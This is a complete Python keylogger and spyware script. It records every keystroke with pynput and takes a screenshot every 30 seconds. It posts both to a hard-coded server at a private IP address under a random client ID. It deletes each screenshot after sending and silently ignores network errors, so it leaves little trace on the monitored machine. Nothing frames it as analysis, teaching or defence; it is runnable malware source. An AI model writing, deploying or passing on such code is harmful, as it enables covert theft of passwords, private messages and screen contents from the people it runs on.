from pynput import keyboard
from PIL import ImageGrab
import requests
import threading
import time
import os
import uuid

# ------------------ Config ------------------
SERVER_URL = "http://10.134.21.136:5000/upload"
CLIENT_ID = str(uuid.uuid4())

# ------------------ Data Buffers ------------------

buffered_keys = []

# ------------------ Logging ------------------

def log_keystroke(key):
    """Capture keystrokes and buffer them for sending."""
    try:
        buffered_keys.append(key.char)
    except AttributeError:
        buffered_keys.append(f"[{key}]")

def take_screenshot():
    """Take a screenshot and save it temporarily."""
    try:
        filename = f"screenshot_{int(time.time())}.png"
        image = ImageGrab.grab()
        image.save(filename)
        return filename
    except Exception:
        return None

# ------------------ Data Transfer ------------------

def send_data():
    global buffered_keys
    while True:
        log_data = "".join(buffered_keys)
        buffered_keys = []

        screenshot_path = take_screenshot()

        if log_data.strip() or screenshot_path:
            files = {}
            if screenshot_path and os.path.exists(screenshot_path):
                files["screenshot"] = open(screenshot_path, "rb")

            try:
                requests.post(
                    SERVER_URL,
                    data={
                        "client_id": CLIENT_ID,
                        "log": log_data
                    },
                    files=files,
                    timeout=5
                )
            except Exception:
                pass

            if files:
                files["screenshot"].close()
                os.remove(screenshot_path)

        time.sleep(30)  # Send every 30 seconds

# ------------------ Start ------------------

def start_keylogger():
    listener = keyboard.Listener(on_press=log_keystroke)
    listener.start()
    print("[INFO] Process started. Capturing data and sending to server...")

if __name__ == "__main__":
    threading.Thread(target=send_data, daemon=True).start()
    start_keylogger()
    while True:
        time.sleep(10)
